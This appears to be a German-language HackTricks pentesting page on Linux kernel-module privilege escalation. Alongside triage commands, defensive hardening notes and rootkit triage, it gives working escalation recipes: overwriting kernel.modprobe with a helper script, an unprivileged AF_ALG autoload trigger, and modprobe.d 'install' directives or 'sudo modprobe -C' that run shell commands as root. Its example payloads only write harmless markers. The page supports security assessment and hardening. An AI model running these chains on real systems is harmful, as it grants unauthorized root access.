# Kernel-Module und modprobe-Missbrauch

{{#include ../../banners/hacktricks-training.md}}

## Fehlkonfigurationen bei Kernel-Modulen und beim Laden von Modulen

Die Unterstützung für Kernel-Module ist ein wichtiger Bereich bei der Überprüfung einer Linux-Privilege-Escalation. Betrachte nicht jede Meldung zu unsignierten Modulen für sich genommen als ausnutzbar, sondern nutze sie, um praktische Fragen zu beantworten.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Kann der aktuelle Benutzer Module über `sudo`, Capabilities oder einen beschreibbaren Hilfspfad laden?
- Ist das Laden von Modulen weiterhin aktiviert?
- Ist die Erzwingung von Modul-Signaturen deaktiviert?
- Sind Modulverzeichnisse, Moduldateien oder Konfigurationspfade von `modprobe.d` beschreibbar?<sup>[[16]](#references)</sup>
- Können Kernel-Logs gelesen werden, um zu bestätigen, was passiert ist?

Eine schnelle Ersteinschätzung beginnt mit den folgenden Prüfungen des Modulstatus, der Signaturen, der Protokollierung und des Modulbaums.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretation:

- `modules_disabled=1` bedeutet, dass Module weder geladen noch entladen werden können und der Wert bis zum Neustart nicht auf `0` zurückgesetzt werden kann.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` in der Kernel-Befehlszeile oder `CONFIG_MODULE_SIG_FORCE=y` erfordert gültig signierte Module; andernfalls können unsignierte Module geladen werden und den Kernel als unsicher kennzeichnen.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` schränkt `dmesg` nicht ein; bei einem Wert von `1` ist für den Zugriff `CAP_SYSLOG` erforderlich.<sup>[[1]](#references)</sup>
- Beschreibbare Pfade unter `/lib/modules/$(uname -r)/` sind gefährlich, da `modprobe` beim Laden von Modulen diesen Verzeichnisbaum und die darin enthaltenen Abhängigkeitsdaten durchsucht.<sup>[[8]](#references)</sup>

### Ein Modul laden und die Kernel-Ausgabe lesen

Wenn du berechtigt bist, ein lokales Modul zu laden, fügt `insmod` genau die angegebene `.ko`-Datei ein. Die Init-Funktion des Moduls wird während des Ladevorgangs ausgeführt, und mit `printk()` ausgegebene Meldungen landen im Kernel-Logpuffer, der normalerweise mit `dmesg` ausgelesen wird.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Ein einfacher Prüfablauf verwendet `modinfo` zur Untersuchung der Metadaten, `insmod` und `rmmod` zum Laden und Entfernen eines Moduls, `lsmod` zur Bestätigung des geladenen Status und `dmesg` zur Untersuchung der Kernel-Protokolle.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Wenn `sudo -l` `insmod`, `modprobe` oder einen Wrapper dafür erlaubt, ist das als kritisch einzustufen: `sudo -l` listet die Berechtigungen des aufrufenden Benutzers auf, und zum Laden eines Kernel-Moduls ist `CAP_SYS_MODULE` erforderlich. Direkte Wege über Capabilities findest du unter [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module).<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### Mit sudo erlaubtes `insmod`

Eine sudo-Regel, die es einem Benutzer erlaubt, `insmod` auszuführen, ist nicht damit vergleichbar, einen gewöhnlichen administrativen Helfer zuzulassen. Der Initialisierungscode des Moduls wird beim Einfügen ausgeführt. Bei der praktischen Prüfung stellt sich daher die Frage, ob dieser Benutzer das zu ladende Modul auswählen oder ändern kann.<sup>[[3]](#references)</sup>

Der folgende allgemeine Prüfablauf wiederholt diese Prüfungen zu Untersuchung, Laden, Zustand, Logs und Entfernen für ein mögliches Modul.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Wenn der Benutzer eine beliebige `.ko` bereitstellen kann, sollte dies bei einer autorisierten Prüfung als vollständige Kompromittierung des Systems behandelt werden. Ein sichereres Vorgehen ist, das Laden von Modulen nicht über sudo zu delegieren. Ist dies unvermeidbar, sollten der genaue Pfad, der Eigentümer, die Berechtigungen, die Signaturrichtlinie und der Ablauf zum Entfernen eingeschränkt werden.<sup>[[3]](#references)[[10]](#references)</sup>

Für ein harmloses Muster zum Erstellen von Modulen in einer kontrollierten Laborumgebung werden unten ein minimales Quellprogramm und eine Makefile gezeigt. Die Form `make -C /lib/modules/$(uname -r)/build M=$PWD` entspricht dem dokumentierten kbuild-Workflow des Kernels für externe Module.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Nur in einem autorisierten Labor erstellen und laden; kbuild erstellt das externe Modul, und die Lade-/Entladebefehle rufen die Kernelmodulschnittstellen auf.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path`-Missbrauchsprüfungen

`kernel.modprobe` bezeichnet den Userspace-Hilfsprozess, den der Kernel bei Anfragen zum automatischen Laden von Modulen ausführt; dieses sysctl beeinflusst das automatische Laden, nicht das explizite Einfügen von Modulen. Kann ein Angreifer den Wert auf einen beschreibbaren ausführbaren Pfad ändern und eine Modul-Anfrage auslösen, wird dieser Hilfsprozess zu einem privilegierten Codeausführungspfad. Wird der Wert auf eine leere Zeichenfolge gesetzt, werden Anfragen zum automatischen Laden deaktiviert; wenn `CONFIG_STATIC_USERMODEHELPER=y` gilt, wird ein nicht leerer Wert durch den fest einkompilierten statischen Hilfsprozesspfad überschrieben.<sup>[[1]](#references)</sup>

Prüfen Sie den aktuellen Hilfsprozesspfad über die Kernel-sysctl-Schnittstelle und kontrollieren Sie Eigentümer und Modus des Ziels.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Prüfen Sie, ob sich sysctl, delegierte sudo-Regeln oder Datei-Capabilities beeinflussen lassen.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Das folgende, ausschließlich für Labore vorgesehene Muster ändert den Pfad des Helpers und löst eine dokumentierte Anfrage zum automatischen Laden eines Moduls aus; verwende es nur auf einem isolierten, autorisierten System.<sup>[[1]](#references)</sup>

Verwende auf aktuellen Linux-Kernels kein unbekanntes ausführbares Programm als generischen Auslöser: Das automatische Laden von Modulen für benutzerdefinierte Binärformate älteren Stils wurde in Linux 6.14 entfernt, während die Kernel-Dokumentation einen unbekannten Dateisystemtyp als Auslöser für eine Anfrage zum automatischen Laden eines Moduls nennt.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Auf gehärteten Systemen sollte dies fehlschlagen, wenn Berechtigungen unprivilegierte Schreibzugriffe auf `kernel.modprobe` verhindern, der Helper-Pfad nicht beschreibbar ist oder das automatische Laden von Modulen deaktiviert ist.<sup>[[1]](#references)</sup>

### Unprivilegierter AF_ALG-Autoload-Trigger

Der obige Dateisystem-Trigger verwendet das privilegierte `mount`.<sup>[[1]](#references)</sup> Wenn AF_ALG-Sockets verfügbar sind, kann ein unprivilegierter Aufrufer stattdessen einen Socket an einen absichtlich nicht existierenden Typ binden.<sup>[[17]](#references)[[18]](#references)</sup> `alg_bind()` fordert daraufhin über `request_module()` `algif-<type>` an, wodurch der konfigurierte Module-Helper aufgerufen wird.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Dies funktioniert auch nach der Entfernung des automatischen Ladens für unbekannte Binärformate in Linux 6.14 weiterhin.<sup>[[11]](#references)[[17]](#references)</sup> Ein fehlgeschlagenes `bind()` ist zu erwarten, da der Typ nicht existiert; prüfe die Nebenwirkung des Helpers statt des Rückgabewerts des Sockets.<sup>[[17]](#references)[[18]](#references)</sup>

Richte in einem autorisierten Lab zuerst den kontrollierten Helper oder die `modprobe.d`-Regel ein und löse dann eine Anfrage ohne `sudo` oder `CAP_SYS_MODULE` aus.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ akzeptiert ein AF_ALG-Bind-Tupel `(type, name)`.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Dieser Pfad erfordert einen verwendbaren AF_ALG-Socket und einen nicht leeren Wert für `kernel.modprobe`.<sup>[[1]](#references)[[18]](#references)</sup> Auf Kerneln mit `/proc/sys/crypto/af_alg_restrict` deaktiviert der Wert `2` das Erstellen von AF_ALG-Sockets; der Wert `1` schränkt Algorithmen ein, verhindert aber nicht die Anfrage nach einem fehlenden Typ in `alg_bind()`.<sup>[[18]](#references)[[21]](#references)</sup> Ein LSM kann die Modulanfrage ablehnen, bevor der Helfer aufgerufen wird.<sup>[[19]](#references)</sup>

### Beschreibbare `modprobe.d`-Konfiguration und `sudo modprobe -C`

Vor dem Auflösen eines Moduls liest `modprobe` `.conf`-Dateien aus Konfigurationsverzeichnissen wie `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` und `/lib/modprobe.d` in der Reihenfolge ihrer Priorität. Eine gleichnamige Datei in einem Verzeichnis mit höherer Priorität überschattet die Datei im Verzeichnis mit niedrigerer Priorität. Noch wichtiger ist, dass eine Direktive `install <module> <command>` einen beliebigen Shell-Befehl ausführt, **anstatt** das Modul einzufügen. Ein beschreibbarer Konfigurationspfad kann daher zu verzögerter Befehlsausführung unter den Berechtigungen eines späteren privilegierten `modprobe`-Aufrufers führen; die Signaturprüfung für Kernelmodule authentifiziert diesen Userspace-Befehl nicht.<sup>[[16]](#references)</sup>

Prüfen Sie die Berechtigungen von Verzeichnissen und Dateien und untersuchen Sie anschließend die effektive Konfiguration. `modprobe -n -v` ist für die Prüfung der Auflösung sicher, da der Probelaufmodus weder das Modul einfügt noch einen `install`-/`remove`-Befehl ausführt. Verwenden Sie bevorzugt `modprobe -c` statt der älteren Schreibweise `--showconfig`, deren Entfernung nach kmod 36 in der aktuellen kmod-Dokumentation angekündigt ist.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Eine uneingeschränkte sudo-Regel für `modprobe` ist ausnutzbar, selbst wenn die Signaturprüfung beliebige `.ko`-Dateien zurückweist: `-C` wählt ein vom Angreifer kontrolliertes Konfigurationsverzeichnis aus, aus dem der von sudo gestartete Prozess einen `install`-Befehl ausführen kann.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Wenn ein für den Kernel-Helper sichtbares `modprobe.d`-Verzeichnis beschreibbar ist, kann derselbe [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger) sofort eine `install algif-htprobe`-Direktive ausführen, ohne darauf zu warten, dass ein Administrator `modprobe` aufruft.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> In einem autorisierten Lab kannst du einen harmlosen Marker-Befehl in eine beschreibbare `.conf`-Datei einfügen, die Auflösung mit `modprobe -n -v algif-htprobe` bestätigen und dann den obigen Trigger ausführen.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` und die Erzwingung von Modulsignaturen verhindern das Einfügen von Modulen, nicht diesen `install`-Befehl im Userspace; ein leeres `kernel.modprobe` oder ein blockierter AF_ALG-Pfad verhindert diese Autoload-Methode jedoch.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Für die Mitigation sollte `modprobe` über sudo nicht ohne Einschränkung der Argumente freigegeben werden. Alle Konfigurationsverzeichnisse sollten dem Benutzer `root` gehören und nicht beschreibbar sein. Unerwartete `install`-/`remove`-Direktiven sollten überprüft werden. Wenn ein vertrauenswürdiger administrativer Ablauf solche Direktiven für ein Modul umgehen muss, ignoriert `modprobe --ignore-install` sie für das angegebene Modul. Abhängigkeiten können jedoch weiterhin eigene Befehle enthalten.<sup>[[8]](#references)[[16]](#references)</sup>

### Überprüfung beschreibbarer `/lib/modules`-Verzeichnisse

Beschreibbare Modulverzeichnisse können den Austausch von Modulen, das Einschleusen schädlicher Module oder den Missbrauch des automatischen Ladens ermöglichen – abhängig davon, wie `modprobe` später aufgerufen wird. `modprobe` durchsucht `/lib/modules/$(uname -r)` und verwendet beim Auflösen von Modulen die dortigen Abhängigkeitsdaten.<sup>[[8]](#references)</sup>

Überprüfen Sie beschreibbare Moduldateien sowie Abhängigkeits- und Alias-Metadaten im Modulverzeichnisbaum der aktiven Kernel-Version.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Wenn du beschreibbaren Modulinhalt findest, untersuche, wie `modprobe` Abhängigkeiten auflöst und wie `modinfo` Modulmetadaten ausgibt.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Defensive Hinweise:

- Halte `/lib/modules` im Besitz von `root:root` und für Benutzer nicht beschreibbar.<sup>[[8]](#references)</sup>
- Setze `kernel.modules_disabled=1` nach dem Booten, sofern dies betrieblich möglich ist.<sup>[[1]](#references)</sup>
- Erzwinge die Modulsignierung auf Systemen, die ladbare Module benötigen.<sup>[[2]](#references)</sup>
- Überwache Schreibzugriffe auf `/proc/sys/kernel/modprobe`, `/lib/modules` und die Konfigurationsverzeichnisse von `modprobe.d` sowie unerwartete Ausführungen von `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Triage von modulbasierten Rootkits

Ein bösartiges Modul kann Syscalls, VFS- oder `/proc`-Ansichten, Netzwerkpfade oder Anmeldedatenprüfungen hooken, um Prozesse und Dateien zu verbergen, Datenverkehr umzuleiten oder Geheimnisse abzufangen. Es kann sich auch aus der von `lsmod` angezeigten Modulliste entfernen. Persistenz kann durch Aliase oder Installationsregeln in `modprobe.d`, `/etc/modules-load.d`, eine systemd-Unit, Inhalte im initramfs oder den Austausch einer legitimen `.ko`-Datei erreicht werden. Ein normales Ergebnis von `lsmod` ist ein nützlicher Beleg, aber bei einer Kompromittierung auf Kernel-Ebene können die vom Kernel bereitgestellten Listen unzuverlässig sein. Gleiche geladene Module, Dateien auf dem Datenträger, Boot-Konfiguration, Modul-Ladeprotokolle und vertrauenswürdige externe Telemetriedaten miteinander ab.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Untersuche unerwartete Modulnamen, Pfade, Abhängigkeiten, Signaturen und Ladezeiten. Kernel-Taint- und Meldungen zu unsignierten Modulen sind Hinweise, aber kein Beweis für ein rootkit. Wenn ein rootkit vermutet wird, sammle Beweise von einem vertrauenswürdigen Image oder aus einer Recovery-Umgebung, bevor du dich auf die Live-Kernel-Ausgabe verlässt. Die Seite zur [Kernel-Schwachstellenbewertung](kernel-vulnerability-assessment.md) behandelt Konfiguration und diagnostische Angriffsflächen, einschließlich tracefs und gepinnter BPF-Objekte.



## References

- [1] [Dokumentation zu /proc/sys/kernel/ — Linux-Kernel-Dokumentation](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Einrichtung zum Signieren von Kernel-Modulen — Linux-Kernel-Dokumentation](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Grundlagen zu Treibern — Linux-Kernel-Dokumentation](https://docs.kernel.org/driver-api/basics.html)
- [6] [Nachrichtenprotokollierung mit printk — Linux-Kernel-Dokumentation](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Externe Module erstellen — Linux-Kernel-Dokumentation](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Tag „execve-v6.14-rc1“ zusammenführen — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [Die modprobe_path-Technik wiederbeleben: Den Patch für search_binary_handler() umgehen — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [AF_ALG-Bindung und Modulanforderung — Linux-Kernel-Quellcode](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Aufruf des Modul-Hilfsprogramms — Linux-Kernel-Quellcode](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Python-Dokumentation](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Linux-Kernel-Dokumentation](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
